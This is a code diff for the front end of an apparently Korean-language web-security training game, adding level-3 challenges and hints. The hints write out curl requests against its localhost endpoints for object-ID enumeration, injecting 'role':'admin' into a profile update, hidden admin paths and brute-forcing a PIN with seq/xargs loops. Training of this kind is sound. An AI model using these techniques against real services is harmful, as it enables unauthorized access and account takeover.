@@ -63,15 +63,108 @@ const FALLBACK_HINTS = {
     { platform: "all", text: "dispatch_token을 decode해서 warehouse_path를 확인하고 open 요청을 완성해." },
   ],
   level3_1: [
-    { platform: "web", text: "F12 Network에서 조회 요청 URL 끝의 parcel_id를 확인해." },
+    { platform: "web", text: "F12 Network에서 /actions/parcels/mine 과 /actions/parcel 요청을 확인해." },
+    { platform: "all", text: "내 owner와 내 parcel_id suffix 패턴을 비교해봐." },
+    { platform: "all", text: "내 번호 주변의 작은 범위를 탐색해봐." },
     {
       platform: "windows",
-      text: 'curl.exe -v -X GET http://localhost:8000/api/v1/challenges/level3_1/actions/parcels/<parcel_id> -H "Authorization: Bearer <token>"',
+      text: 'curl.exe -v -X GET "http://localhost:8000/api/v1/challenges/level3_1/actions/parcel?parcel_id=<parcel_id>" -H "Authorization: Bearer <token>"',
     },
     {
       platform: "unix",
-      text: "curl -v -X GET http://localhost:8000/api/v1/challenges/level3_1/actions/parcels/<parcel_id> -H 'Authorization: Bearer <token>'",
+      text: "curl -v -X GET 'http://localhost:8000/api/v1/challenges/level3_1/actions/parcel?parcel_id=<parcel_id>' -H 'Authorization: Bearer <token>'",
     },
+    { platform: "all", text: "DevTools의 Request Headers에서 Authorization 값을 확인해 재사용해." },
+  ],
+  level3_2: [
+    { platform: "web", text: "F12 Network에서 /actions/menu 응답을 열고 features를 확인해. 숨겨진 항목이 여러 개다." },
+    { platform: "all", text: "경로가 basePath + endpoints 형태로 나뉘어 있다면 조합해야 한다." },
+    { platform: "all", text: "숨겨진 기능이 여러 개라면 모두 시도해봐. FLAG가 어디 있을지 모른다." },
+    {
+      platform: "windows",
+      text: 'curl.exe -v http://localhost:8000/api/v1/challenges/level3_2/actions/menu -H "Authorization: Bearer <token>"',
+    },
+    {
+      platform: "unix",
+      text: "curl -v http://localhost:8000/api/v1/challenges/level3_2/actions/menu -H 'Authorization: Bearer <token>'",
+    },
+    { platform: "all", text: "DevTools의 Request Headers에서 Authorization 값을 확인해 재사용해." },
+  ],
+  level3_3: [
+    { platform: "web", text: "F12 Network에서 프로필 저장 요청의 Request Payload를 확인해." },
+    { platform: "all", text: "UI에 없는 JSON 키를 추가해도 전송은 가능하다." },
+    { platform: "all", text: "tier 대신 role 또는 account_info.is_admin을 주입해 /actions/perks 응답을 다시 확인해." },
+    {
+      platform: "windows",
+      text: 'curl -v -X PUT http://localhost:8000/api/v1/challenges/level3_3/actions/profile -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\\"address\\":\\"Busan\\",\\"role\\":\\"admin\\"}"',
+    },
+    {
+      platform: "unix",
+      text: "curl -v -X PUT http://localhost:8000/api/v1/challenges/level3_3/actions/profile -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' -d '{\"address\":\"Busan\",\"role\":\"admin\"}'",
+    },
+    { platform: "all", text: "DevTools의 Request Headers에서 Authorization 값을 확인해 재사용해." },
+  ],
+  level3_4: [
+    { platform: "web", text: "F12 Network에서 /actions/ticket 응답(JSON)을 끝까지 펼쳐봐." },
+    { platform: "all", text: "2-1은 Header였다. 이번엔 Body(JSON)다." },
+    { platform: "all", text: "debug / meta / internal 키워드를 찾아봐. 값이 FLAG 형태가 아닐 수도 있다." },
+    {
+      platform: "windows",
+      text: 'curl -v "http://localhost:8000/api/v1/challenges/level3_4/actions/ticket?id=SUP-1004" -H "Authorization: Bearer <token>"',
+    },
+    {
+      platform: "windows",
+      text: 'curl -s "http://localhost:8000/api/v1/challenges/level3_4/actions/ticket?id=SUP-1004" -H "Authorization: Bearer <token>" | findstr RkxB',
+    },
+    {
+      platform: "unix",
+      text: "curl -v 'http://localhost:8000/api/v1/challenges/level3_4/actions/ticket?id=SUP-1004' -H 'Authorization: Bearer <token>'",
+    },
+    {
+      platform: "unix",
+      text: "curl -s 'http://localhost:8000/api/v1/challenges/level3_4/actions/ticket?id=SUP-1004' -H 'Authorization: Bearer <token>' | grep RkxB",
+    },
+    { platform: "all", text: "DevTools의 Request Headers에서 Authorization 값을 확인해 재사용해." },
+  ],
+  level3_5: [
+    { platform: "all", text: "PIN은 77** 형태다. 남은 경우의 수는 100개." },
+    { platform: "web", text: "Network에서 반복 요청 시 서버가 차단(429/lockout)하는지 확인해." },
+    { platform: "all", text: "핵심은 반복 시도 통제의 부재다." },
+    {
+      platform: "windows",
+      text: 'curl -X POST http://localhost:8000/api/v1/challenges/level3_5/actions/locker/unlock -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\\"locker_id\\":\\"SL-01\\",\\"pin\\":\\"7700\\"}"',
+    },
+    {
+      platform: "windows",
+      text: 'curl -s -X POST http://localhost:8000/api/v1/challenges/level3_5/actions/locker/unlock -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\\"locker_id\\":\\"SL-01\\",\\"pin\\":\\"7700\\"}" | findstr unlocked',
+    },
+    {
+      platform: "unix",
+      text: "curl -X POST http://localhost:8000/api/v1/challenges/level3_5/actions/locker/unlock -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' -d '{\"locker_id\":\"SL-01\",\"pin\":\"7700\"}'",
+    },
+    {
+      platform: "unix",
+      text: "curl -s -X POST http://localhost:8000/api/v1/challenges/level3_5/actions/locker/unlock -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' -d '{\"locker_id\":\"SL-01\",\"pin\":\"7700\"}' | grep unlocked",
+    },
+    { platform: "all", text: "DevTools의 Request Headers에서 Authorization 값을 확인해 재사용해." },
+    { platform: "all", text: "자동화: seq 7700 7799 | xargs -I{} ... 또는 for i in $(seq 7700 7799); do ...; done" },
+  ],
+  level3_boss: [
+    { platform: "web", text: "택배 상세 조회 요청에서 parcel_id가 어디에 붙는지 먼저 확인해." },
+    { platform: "all", text: "VIP 택배 응답에는 audit 단서가 있다. 내 택배에는 없을 수 있다." },
+    { platform: "web", text: "menu 응답에는 UI에 숨겨진 관리자 path가 들어있다." },
+    { platform: "all", text: "프로필 업데이트는 address 화면이지만 서버가 role까지 저장할 수 있다." },
+    { platform: "all", text: "audit 응답 JSON을 끝까지 펼쳐 debug/meta/internal 구조를 확인해." },
+    { platform: "all", text: "locker PIN은 78** 형태다. 남은 경우의 수는 100개." },
+    {
+      platform: "windows",
+      text: 'curl -H "Authorization: Bearer <token>" "http://localhost:8000/api/v1/challenges/level3_boss/actions/parcel?parcel_id=PD-1006"',
+    },
+    {
+      platform: "windows",
+      text: 'curl -X POST http://localhost:8000/api/v1/challenges/level3_boss/actions/vault/claim -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\\"vault_ticket\\":\\"<ticket>\\",\\"claim_code\\":\\"<code>\\"}"',
+    },
+    { platform: "all", text: "DevTools의 Request Headers에서 Authorization 값을 확인해 재사용해." },
   ],
 };
 
@@ -84,7 +177,12 @@ const TERMINAL_INTRO_HINTS = {
   level2_3: "응답의 dispatch_token을 디코딩해서 payload를 확인해.",
   level2_4: "위조한 토큰을 Authorization 헤더로 보내 Express Lane 응답을 확인해.",
   level2_5: "클릭은 실패한다. 토큰/헤더/바디를 직접 조합해 봉인 창고를 열어봐.",
-  level3_1: "내 택배 조회 요청을 관찰한 뒤 parcel_id를 바꿔봐.",
+  level3_1: "내 택배(owner/parcel 패턴)를 확인하고 주변 parcel_id를 탐색해봐.",
+  level3_2: "menu 응답의 숨은 기능 경로를 찾아 직접 호출해봐.",
+  level3_3: "프로필 저장 body를 변조해 role/is_admin을 주입한 뒤 perks를 조회해봐.",
+  level3_4: "지원 티켓 응답 JSON을 끝까지 펼쳐 debug/internal 필드를 확인해봐.",
+  level3_5: "PIN은 77**. seq/xargs/for 루프로 자동화해 unlock 응답 변화를 관찰해봐.",
+  level3_boss: "체인 공격: parcel -> profile -> menu/audit -> locker -> vault claim",
 };
 
 async function apiRequest(path, { method = "GET", token, body } = {}) {
@@ -140,6 +238,9 @@ function challengeShortLabel(challenge, index) {
   }
   if (challenge?.id === "level1_3") {
     return "1-3";
+  }
+  if (challenge?.id === "level3_boss") {
+    return "3-B";
   }
   return `L${index + 1}`;
 }
@@ -690,7 +791,11 @@ function App() {
     selectedId === "level2_2" ||
     selectedId === "level2_3" ||
     selectedId === "level2_5" ||
-    selectedId === "level3_1";
+    selectedId === "level3_1" ||
+    selectedId === "level3_2" ||
+    selectedId === "level3_4" ||
+    selectedId === "level3_5" ||
+    selectedId === "level3_boss";
 
   const selectedPatchIds = useMemo(
     () => (Array.isArray(resultById[`patch:${selectedId}`]) ? resultById[`patch:${selectedId}`] : []),
@@ -1071,7 +1176,78 @@ function App() {
       return;
     }
     try {
-      const response = await fetch(`${API_BASE}/challenges/level3_1/actions/parcels/PD-1004`, {
+      const mineResponse = await fetch(`${API_BASE}/challenges/level3_1/actions/parcels/mine`, {
+        method: "GET",
+        headers: {
+          Authorization: `Bearer ${token}`,
+        },
+        cache: "no-store",
+      });
+      if (!mineResponse.ok) {
+        const raw = await mineResponse.text();
+        let message = `요청 실패 (${mineResponse.status})`;
+        try {
+          const parsed = JSON.parse(raw);
+          message = parsed?.error?.message || parsed?.detail || message;
+        } catch {
+          // keep fallback
+        }
+        setActionMessageById((prev) => ({ ...prev, [selectedId]: message }));
+        return;
+      }
+
+      const mineRaw = await mineResponse.text();
+      let mineParsed = null;
+      try {
+        mineParsed = mineRaw ? JSON.parse(mineRaw) : null;
+      } catch {
+        mineParsed = null;
+      }
+      const mineData = mineParsed?.data || mineParsed || {};
+      const mineParcelId = mineData?.parcels?.[0]?.parcel_id || "PD-1004";
+
+      const detailResponse = await fetch(
+        `${API_BASE}/challenges/level3_1/actions/parcel?parcel_id=${encodeURIComponent(mineParcelId)}`,
+        {
+          method: "GET",
+          headers: {
+            Authorization: `Bearer ${token}`,
+          },
+          cache: "no-store",
+        }
+      );
+      if (!detailResponse.ok) {
+        const raw = await detailResponse.text();
+        let message = `요청 실패 (${detailResponse.status})`;
+        try {
+          const parsed = JSON.parse(raw);
+          message = parsed?.error?.message || parsed?.detail || message;
+        } catch {
+          // keep fallback
+        }
+        setActionMessageById((prev) => ({ ...prev, [selectedId]: message }));
+        return;
+      }
+
+      setActionMessageById((prev) => ({
+        ...prev,
+        [selectedId]:
+          "내 택배 흐름 조회 완료. Network에서 owner/parcel 패턴을 확인하고 parcel_id를 주변 범위로 바꿔 재요청해봐.",
+      }));
+    } catch (error) {
+      setActionMessageById((prev) => ({
+        ...prev,
+        [selectedId]: error.message || "요청 전송 실패",
+      }));
+    }
+  }, [selectedId, token]);
+
+  const handleMenuProbeRequest = useCallback(async () => {
+    if (!token) {
+      return;
+    }
+    try {
+      const response = await fetch(`${API_BASE}/challenges/level3_2/actions/menu`, {
         method: "GET",
         headers: {
           Authorization: `Bearer ${token}`,
@@ -1093,7 +1269,121 @@ function App() {
       setActionMessageById((prev) => ({
         ...prev,
         [selectedId]:
-          "내 택배 조회 완료. Network 요청 URL 끝 parcel_id를 다른 값으로 바꿔 재요청해봐.",
+          "menu 조회 완료. Network 응답에서 features.admin_panel.path를 확인하고 해당 경로를 직접 호출해봐.",
+      }));
+    } catch (error) {
+      setActionMessageById((prev) => ({
+        ...prev,
+        [selectedId]: error.message || "요청 전송 실패",
+      }));
+    }
+  }, [selectedId, token]);
+
+  const handleTicketProbeRequest = useCallback(async () => {
+    if (!token) {
+      return;
+    }
+    try {
+      const response = await fetch(`${API_BASE}/challenges/level3_4/actions/ticket?id=SUP-1004`, {
+        method: "GET",
+        headers: {
+          Authorization: `Bearer ${token}`,
+        },
+        cache: "no-store",
+      });
+      if (!response.ok) {
+        const raw = await response.text();
+        let message = `요청 실패 (${response.status})`;
+        try {
+          const parsed = JSON.parse(raw);
+          message = parsed?.error?.message || parsed?.detail || message;
+        } catch {
+          // keep fallback
+        }
+        setActionMessageById((prev) => ({ ...prev, [selectedId]: message }));
+        return;
+      }
+      setActionMessageById((prev) => ({
+        ...prev,
+        [selectedId]:
+          "지원 티켓 조회 완료. Network Response에서 debug/meta/internal 필드를 끝까지 펼쳐봐.",
+      }));
+    } catch (error) {
+      setActionMessageById((prev) => ({
+        ...prev,
+        [selectedId]: error.message || "요청 전송 실패",
+      }));
+    }
+  }, [selectedId, token]);
+
+  const handleLockerHintRequest = useCallback(async () => {
+    if (!token) {
+      return;
+    }
+    try {
+      const response = await fetch(
+        `${API_BASE}/challenges/level3_5/actions/locker/hint?locker_id=SL-01`,
+        {
+          method: "GET",
+          headers: {
+            Authorization: `Bearer ${token}`,
+          },
+          cache: "no-store",
+        }
+      );
+      if (!response.ok) {
+        const raw = await response.text();
+        let message = `요청 실패 (${response.status})`;
+        try {
+          const parsed = JSON.parse(raw);
+          message = parsed?.error?.message || parsed?.detail || message;
+        } catch {
+          // keep fallback
+        }
+        setActionMessageById((prev) => ({ ...prev, [selectedId]: message }));
+        return;
+      }
+      setActionMessageById((prev) => ({
+        ...prev,
+        [selectedId]:
+          "락커 힌트 조회 완료. Network에서 77** 단서를 확인하고 unlock 요청을 반복해봐.",
+      }));
+    } catch (error) {
+      setActionMessageById((prev) => ({
+        ...prev,
+        [selectedId]: error.message || "요청 전송 실패",
+      }));
+    }
+  }, [selectedId, token]);
+
+  const handleBossMineRequest = useCallback(async () => {
+    if (!token) {
+      return;
+    }
+    try {
+      const response = await fetch(`${API_BASE}/challenges/level3_boss/actions/parcels/mine`, {
+        method: "GET",
+        headers: {
+          Authorization: `Bearer ${token}`,
+        },
+        cache: "no-store",
+      });
+      if (!response.ok) {
+        const raw = await response.text();
+        let message = `요청 실패 (${response.status})`;
+        try {
+          const parsed = JSON.parse(raw);
+          message = parsed?.error?.message || parsed?.detail || message;
+        } catch {
+          // keep fallback
+        }
+        setActionMessageById((prev) => ({ ...prev, [selectedId]: message }));
+        return;
+      }
+      setActionMessageById((prev) => ({
+        ...prev,
+        [selectedId]:
+          "내 택배 조회 완료. 이제 Network에서 parcel_id를 바꿔 VIP 택배, audit_ref, admin path, vault 단서를 순서대로 연결해.",
       }));
     } catch (error) {
       setActionMessageById((prev) => ({
@@ -1240,7 +1530,15 @@ function App() {
                               ? handleDispatchRequest
                               : selectedId === "level2_5"
                                 ? handleBossGateAttempt
-                                : handleMyParcelRequest
+                                : selectedId === "level3_1"
+                                  ? handleMyParcelRequest
+                                  : selectedId === "level3_2"
+                                    ? handleMenuProbeRequest
+                                    : selectedId === "level3_4"
+                                      ? handleTicketProbeRequest
+                                      : selectedId === "level3_5"
+                                        ? handleLockerHintRequest
+                                        : handleBossMineRequest
                       }
                       disabled={currentTerminalBusy || !detail.attack?.enabled}
                     >
@@ -1252,7 +1550,15 @@ function App() {
                             ? "발송 토큰 요청 보내기"
                             : selectedId === "level2_5"
                               ? "봉인 창고 열기 시도"
-                              : "내 택배 조회"}
+                              : selectedId === "level3_1"
+                                ? "내 택배 조회"
+                                : selectedId === "level3_2"
+                                  ? "메뉴 동기화"
+                                  : selectedId === "level3_4"
+                                    ? "지원 티켓 불러오기"
+                                    : selectedId === "level3_5"
+                                      ? "락커 힌트 조회"
+                                      : "내 택배 보기"}
                     </button>
                     <p className="caption">
                       {selectedId === "level2_1" ? (
@@ -1272,15 +1578,55 @@ function App() {
                           이 버튼은 항상 막힌 흐름이다. Network에서 <code>/actions/dispatch</code> 와{" "}
                           <code>/actions/open</code> 요청을 분석해.
                         </>
+                      ) : selectedId === "level3_1" ? (
+                        <>
+                          버튼을 누른 직후 Network에서 <code>/actions/parcels/mine</code> 과{" "}
+                          <code>/actions/parcel?parcel_id=...</code> 요청을 확인해.
+                        </>
+                      ) : selectedId === "level3_2" ? (
+                        <>
+                          버튼을 누른 직후 Network에서 <code>/actions/menu</code> 응답의 hidden path를 확인해.
+                        </>
+                      ) : selectedId === "level3_4" ? (
+                        <>
+                          버튼을 누른 직후 Network에서 <code>/actions/ticket?id=SUP-1004</code> 응답 JSON을 확인해.
+                        </>
+                      ) : selectedId === "level3_5" ? (
+                        <>
+                          버튼을 누른 직후 Network에서 <code>/actions/locker/hint</code> 응답을 확인하고,{" "}
+                          <code>/actions/locker/unlock</code> 반복 요청을 시도해.
+                        </>
                       ) : (
                         <>
-                          버튼을 누른 직후 Network에서 <code>/actions/parcels/PD-1004</code> 요청을 확인해.
+                          버튼을 누른 직후 Network에서 <code>/actions/parcels/mine</code> 요청을 확인하고, 체인 단계별로{" "}
+                          <code>parcel</code> -> <code>profile</code> -> <code>menu/admin/audit</code> ->{" "}
+                          <code>locker/unlock</code> -> <code>vault/claim</code> 흐름을 연결해.
                         </>
                       )}
                     </p>
                     {selectedId === "level3_1" && (
                       <div className="action-note">
-                        📢 [시스템 공지] VIP 전용 택배 (Tracking No: PD-1005)가 오늘 배송될 예정입니다.
+                        📢 [시스템 공지] VIP 전용 택배가 오늘 허브를 통과할 예정입니다. (추적번호 일부 마스킹)
+                      </div>
+                    )}
+                    {selectedId === "level3_2" && (
+                      <div className="action-note">
+                        관리자 메뉴는 UI에서 숨김 처리되어 있습니다. (enabled=false)
+                      </div>
+                    )}
+                    {selectedId === "level3_4" && (
+                      <div className="action-note">
+                        화면에는 일부 필드만 표시된다. 원본 Response(JSON)를 끝까지 펼쳐서 확인해.
+                      </div>
+                    )}
+                    {selectedId === "level3_5" && (
+                      <div className="action-note">
+                        자동화 버튼은 없다. 터미널에서 seq/xargs/for로 반복 요청 자동화를 직접 시도해.
+                      </div>
+                    )}
+                    {selectedId === "level3_boss" && (
+                      <div className="action-note">
+                        FINAL BOSS: 한 가지가 아니라 취약점 체인이다. 단계 단서를 연결해서 최종 claim을 완성해.
                       </div>
                     )}
                     {currentActionMessage && <div className="action-note">{currentActionMessage}</div>}
